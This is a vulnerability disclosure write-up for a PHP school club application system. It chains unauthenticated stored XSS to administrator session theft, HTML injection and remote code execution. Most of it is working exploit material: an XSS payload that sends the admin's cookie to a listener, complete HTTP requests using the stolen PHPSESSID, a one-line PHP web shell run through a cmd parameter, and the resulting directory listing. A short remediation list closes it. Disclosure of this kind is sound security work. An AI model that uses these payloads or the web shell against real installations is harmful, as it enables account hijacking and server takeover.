# School Club Application System 

Issue: Unauthenticated Stored Cross-Site Scripting to HTML injection to RCE

Author: Zak Clifford

Date: 12.04.2022

Vendor: https://www.sourcecodester.com/php/15266/school-club-application-system-phpoop-free-source-code.html

Software: https://www.sourcecodester.com/sites/default/files/download/oretnom23/scas_0.zip

Reference: https://github.com/ZSECURE

Tested on: Windows, MySQL, Apache

---

## Summary

While testing a Free and open-source software (FOSS) application, a flaw was identified where an unauthenticated threat actor could apply to join a book club, inject an XSS payload and steal administrators of the application session cookies, either an Admin or a Club Admin role. With the session cookie, logging in to the application as admin, it’s possible to add PHP code to the about-us and home page. Adding a PHP shell it's possible to execute commands on the webserver.

## Proof of Concept

### Unauthenticated Stored XSS

Manual walkthrough: Apply to a club and click on `Submit Application`

Direct approach: Navigate to the following URL `http://localhost/scas/?page=clubs/application_form&id=7`

Screenshot of the vulnerable input field:

![Untitled](Untitled.png)

Insert the following payload in the firstname parameter

```html
m1st3r3"><img src=x onerror="this.src='http://127.0.0.1:8000/?'+document.cookie; this.removeAttribute('onerror');">
```

The post request with the payload is here

```html
POST /scas/classes/Master.php?f=save_application HTTP/1.1
Host: localhost
Content-Length: 1326
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEWvm4hOYmjUAAlLT
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/scas/?page=clubs/application_form&id=7
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundaryEWvm4hOYmjUAAlLT
Content-Disposition: form-data; name="id"

------WebKitFormBoundaryEWvm4hOYmjUAAlLT
Content-Disposition: form-data; name="club_id"

7
------WebKitFormBoundaryEWvm4hOYmjUAAlLT
Content-Disposition: form-data; name="firstname"

m1st3r3"><img src=x onerror="this.src='http://127.0.0.1:8000/?'+document.cookie; this.removeAttribute('onerror');">
------WebKitFormBoundaryEWvm4hOYmjUAAlLT
Content-Disposition: form-data; name="middlename"

------WebKitFormBoundaryEWvm4hOYmjUAAlLT
Content-Disposition: form-data; name="lastname"

test
------WebKitFormBoundaryEWvm4hOYmjUAAlLT
Content-Disposition: form-data; name="gender"

Male
------WebKitFormBoundaryEWvm4hOYmjUAAlLT
Content-Disposition: form-data; name="year_level"

2022
------WebKitFormBoundaryEWvm4hOYmjUAAlLT
Content-Disposition: form-data; name="section"

test
------WebKitFormBoundaryEWvm4hOYmjUAAlLT
Content-Disposition: form-data; name="email"

123@123.com
------WebKitFormBoundaryEWvm4hOYmjUAAlLT
Content-Disposition: form-data; name="contact"

0123456789
------WebKitFormBoundaryEWvm4hOYmjUAAlLT
Content-Disposition: form-data; name="address"

------WebKitFormBoundaryEWvm4hOYmjUAAlLT
Content-Disposition: form-data; name="message"

------WebKitFormBoundaryEWvm4hOYmjUAAlLT--
```

Start a Python HTTP web server listening on port 8000 to capture the request

```html
PS C:\xampp\htdocs\scas> python -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
::ffff:127.0.0.1 - - [11/Apr/2022 22:54:46] "GET /?PHPSESSID=qvch5e9s97c9cfpsi23f2iureq HTTP/1.1" 200 -
::ffff:127.0.0.1 - - [11/Apr/2022 23:15:37] "GET /?PHPSESSID=qvch5e9s97c9cfpsi23f2iureq HTTP/1.1" 200 -
::ffff:127.0.0.1 - - [12/Apr/2022 10:26:35] "GET /?PHPSESSID=qvch5e9s97c9cfpsi23f2iureq HTTP/1.1" 200 -
::ffff:127.0.0.1 - - [12/Apr/2022 10:26:49] "GET /?PHPSESSID=qvch5e9s97c9cfpsi23f2iureq HTTP/1.1" 200 -
::ffff:127.0.0.1 - - [12/Apr/2022 10:32:01] "GET /?PHPSESSID=qvch5e9s97c9cfpsi23f2iureq HTTP/1.1" 200 -
```

Now when an admin or a club admin logs in and views the applications, the stored XSS is triggered and it’s possible to capture the session cookie. Once the cookie has been captured, it’s possible to log in as that user with the cookie.

### HTML Injection

With the admin's session cookie, it’s possible to inject code into the index.php and about-us.php to manipulate the page and possibly get command execution.

Request:

```html
POST /scas/classes/SystemSettings.php?f=update_settings HTTP/1.1
Host: localhost
Content-Length: 5552
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylq5Nntc4amccqP1S
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/scas/admin/?page=system
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=qvch5e9s97c9cfpsi23f2iureq
Connection: close

------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="name"

School Club Application System
------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="short_name"

SCAS - PHP
------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="content[welcome]"

<h1>HTML injection is possible here!</h1><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: "Open Sans", Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum leo in purus commodo accumsan. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam et ligula gravida, rhoncus magna vel, tristique nibh. Nullam molestie, risus ac pretium mattis, massa dui tristique nunc, eu lacinia leo lorem consequat libero. Donec vitae nisi semper, pulvinar felis quis, mattis sem. Nulla quis dolor in lorem tempor posuere. Mauris non nunc vel ex malesuada pellentesque non egestas ligula. Donec consequat nunc non enim pretium aliquet. Maecenas non arcu a quam aliquam malesuada ut eget arcu. Curabitur sit amet est lorem. Aenean commodo mi vel magna semper dignissim. Fusce commodo orci nec placerat laoreet. Praesent nisl lectus, varius sit amet molestie a, luctus ut ipsum. Sed quis massa quis lorem auctor eleifend. Integer eget nulla sit amet massa commodo porttitor. Duis justo tortor, euismod vitae leo ac, pharetra mattis justo.</p><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: "Open Sans", Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);">Pellentesque auctor dictum porttitor. Ut ultricies feugiat mollis. Aenean pretium pulvinar aliquam. Maecenas lobortis ornare tortor vitae vestibulum. Quisque aliquam neque eget magna venenatis, sit amet auctor ex elementum. Etiam ullamcorper sapien quis metus interdum cursus. Curabitur quis ligula molestie, sollicitudin ipsum ac, fringilla dui. Ut sit amet ornare nulla. Vestibulum condimentum sem at velit vehicula, sit amet hendrerit augue finibus. In hac habitasse platea dictumst.</p>
------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="content[about]"

<h1>HTML injection is possible here!</h1><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: " open="" sans",="" arial,="" sans-serif;="" font-size:="" 14px;="" background-color:="" rgb(255,="" 255,="" 255);"="">In scelerisque risus elit, sed imperdiet magna porttitor eu. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Etiam non augue eget lacus semper placerat in at libero. Sed a libero malesuada, pharetra elit posuere, sagittis ligula. Pellentesque aliquam ultrices arcu, sed blandit leo euismod in. Vestibulum luctus diam orci, eget convallis nisl dapibus rutrum. Aliquam nec dui lobortis, consectetur sem et, semper urna. Morbi at nunc nibh. Curabitur placerat tortor in quam dignissim volutpat. Integer ac purus vel nulla posuere gravida. Sed justo ex, venenatis eget interdum sit amet, tincidunt at neque. Cras vitae urna at leo commodo cursus. Duis at ligula non orci sodales ultricies. Fusce vulputate convallis augue, egestas semper diam condimentum et. Duis ante purus, tincidunt eu est in, ullamcorper molestie ante. Pellentesque sodales sit amet massa vitae vulputate.</p><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: " open="" sans",="" arial,="" sans-serif;="" font-size:="" 14px;="" background-color:="" rgb(255,="" 255,="" 255);"="">Quisque fringilla, mi quis blandit posuere, nulla lorem sagittis dui, et dapibus urna nisl et nisl. Sed vel leo rutrum, suscipit urna at, elementum augue. Donec vitae gravida lacus. Sed accumsan ligula sit amet nisi scelerisque, ac malesuada ligula pharetra. Nulla pellentesque nisl quis purus congue, id luctus lacus aliquam. Phasellus magna dolor, tempus vel cursus sed, sollicitudin sit amet est. Donec et ultrices odio. Proin posuere, arcu sit amet rhoncus sagittis, lacus mi porttitor dolor, quis ornare arcu ante ac tortor. Aliquam porttitor velit in viverra eleifend. Nam quis ullamcorper orci. Suspendisse bibendum justo id diam eleifend, non molestie libero mattis. Quisque felis nunc, fringilla sit amet pretium nec, rhoncus vel sapien. Proin auctor cursus nulla sed hendrerit.</p><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: " open="" sans",="" arial,="" sans-serif;="" font-size:="" 14px;="" background-color:="" rgb(255,="" 255,="" 255);"=""><br></p>
------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="cover"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundarylq5Nntc4amccqP1S--
```

![Untitled](Untitled%201.png)

### Remote Code Execution

Following on from the previous HTML injection issue it’s possible to add a PHP shell to the page and execute commands.

Adding this payload `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>` to the end of the loren ipsum.

```php
POST /scas/classes/SystemSettings.php?f=update_settings HTTP/1.1
Host: localhost
Content-Length: 5552
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylq5Nntc4amccqP1S
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/scas/admin/?page=system
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=qvch5e9s97c9cfpsi23f2iureq
Connection: close

------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="name"

School Club Application System
------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="short_name"

SCAS - PHP
------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="content[welcome]"

<p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: "Open Sans", Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum leo in purus commodo accumsan. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam et ligula gravida, rhoncus magna vel, tristique nibh. Nullam molestie, risus ac pretium mattis, massa dui tristique nunc, eu lacinia leo lorem consequat libero. Donec vitae nisi semper, pulvinar felis quis, mattis sem. Nulla quis dolor in lorem tempor posuere. Mauris non nunc vel ex malesuada pellentesque non egestas ligula. Donec consequat nunc non enim pretium aliquet. Maecenas non arcu a quam aliquam malesuada ut eget arcu. Curabitur sit amet est lorem. Aenean commodo mi vel magna semper dignissim. Fusce commodo orci nec placerat laoreet. Praesent nisl lectus, varius sit amet molestie a, luctus ut ipsum. Sed quis massa quis lorem auctor eleifend. Integer eget nulla sit amet massa commodo porttitor. Duis justo tortor, euismod vitae leo ac, pharetra mattis justo.</p><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: "Open Sans", Arial, sans-serif; font-size: 14px; background-color: rgb(255, 255, 255);">Pellentesque auctor dictum porttitor. Ut ultricies feugiat mollis. Aenean pretium pulvinar aliquam. Maecenas lobortis ornare tortor vitae vestibulum. Quisque aliquam neque eget magna venenatis, sit amet auctor ex elementum. Etiam ullamcorper sapien quis metus interdum cursus. Curabitur quis ligula molestie, sollicitudin ipsum ac, fringilla dui. Ut sit amet ornare nulla. Vestibulum condimentum sem at velit vehicula, sit amet hendrerit augue finibus. In hac habitasse platea dictumst.</p><?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="content[about]"

<p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: " open="" sans",="" arial,="" sans-serif;="" font-size:="" 14px;="" background-color:="" rgb(255,="" 255,="" 255);"="">In scelerisque risus elit, sed imperdiet magna porttitor eu. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Etiam non augue eget lacus semper placerat in at libero. Sed a libero malesuada, pharetra elit posuere, sagittis ligula. Pellentesque aliquam ultrices arcu, sed blandit leo euismod in. Vestibulum luctus diam orci, eget convallis nisl dapibus rutrum. Aliquam nec dui lobortis, consectetur sem et, semper urna. Morbi at nunc nibh. Curabitur placerat tortor in quam dignissim volutpat. Integer ac purus vel nulla posuere gravida. Sed justo ex, venenatis eget interdum sit amet, tincidunt at neque. Cras vitae urna at leo commodo cursus. Duis at ligula non orci sodales ultricies. Fusce vulputate convallis augue, egestas semper diam condimentum et. Duis ante purus, tincidunt eu est in, ullamcorper molestie ante. Pellentesque sodales sit amet massa vitae vulputate.</p><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: " open="" sans",="" arial,="" sans-serif;="" font-size:="" 14px;="" background-color:="" rgb(255,="" 255,="" 255);"="">Quisque fringilla, mi quis blandit posuere, nulla lorem sagittis dui, et dapibus urna nisl et nisl. Sed vel leo rutrum, suscipit urna at, elementum augue. Donec vitae gravida lacus. Sed accumsan ligula sit amet nisi scelerisque, ac malesuada ligula pharetra. Nulla pellentesque nisl quis purus congue, id luctus lacus aliquam. Phasellus magna dolor, tempus vel cursus sed, sollicitudin sit amet est. Donec et ultrices odio. Proin posuere, arcu sit amet rhoncus sagittis, lacus mi porttitor dolor, quis ornare arcu ante ac tortor. Aliquam porttitor velit in viverra eleifend. Nam quis ullamcorper orci. Suspendisse bibendum justo id diam eleifend, non molestie libero mattis. Quisque felis nunc, fringilla sit amet pretium nec, rhoncus vel sapien. Proin auctor cursus nulla sed hendrerit.</p><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px; text-align: justify; font-family: " open="" sans",="" arial,="" sans-serif;="" font-size:="" 14px;="" background-color:="" rgb(255,="" 255,="" 255);"=""><br></p><?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundarylq5Nntc4amccqP1S
Content-Disposition: form-data; name="cover"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundarylq5Nntc4amccqP1S--
```

The simply requesting the `index.php` page with the parameter `cmd=<command>` it’s possible to execute commands 

Request:

```html
GET /scas/index.php?cmd=dir HTTP/1.1
Host: localhost
Content-Length: 0

```

Response:

```html
HTTP/1.1 200 OK

<snipped for brevity>

<pre> Volume in drive C is OS
 Volume Serial Number is 9C4B-142B

 Directory of C:\xampp\htdocs\scas

10/04/2022  19:09    <DIR>          .
10/04/2022  19:09    <DIR>          ..
10/04/2022  15:35               225 .htaccess
12/04/2022  18:05             2,533 about.html
10/04/2022  15:35               220 about.php
10/04/2022  16:14    <DIR>          admin
10/04/2022  16:15    <DIR>          assets
10/04/2022  16:14    <DIR>          classes
10/04/2022  17:17    <DIR>          clubs
10/04/2022  16:14    <DIR>          club_admin
10/04/2022  16:14    <DIR>          club_contents
10/04/2022  15:35             1,297 config.php
10/04/2022  16:14    <DIR>          database
10/04/2022  15:35               256 home.php
10/04/2022  16:14    <DIR>          includes
10/04/2022  15:35             3,010 index.php
10/04/2022  15:35               647 initialize.php
10/04/2022  16:14    <DIR>          uploads
12/04/2022  18:05             1,955 welcome.html
              10 File(s)         11,553 bytes
              11 Dir(s)  181,660,803,072 bytes free
</pre>
```

This is my first CVE so be kind 😃

## Remediations

- HTML encode the user input so that it’s not executed by the webserver
- Mark the session cookie HTTPOnly `PHPSESSID`
- Implement a Content-Security-Policy
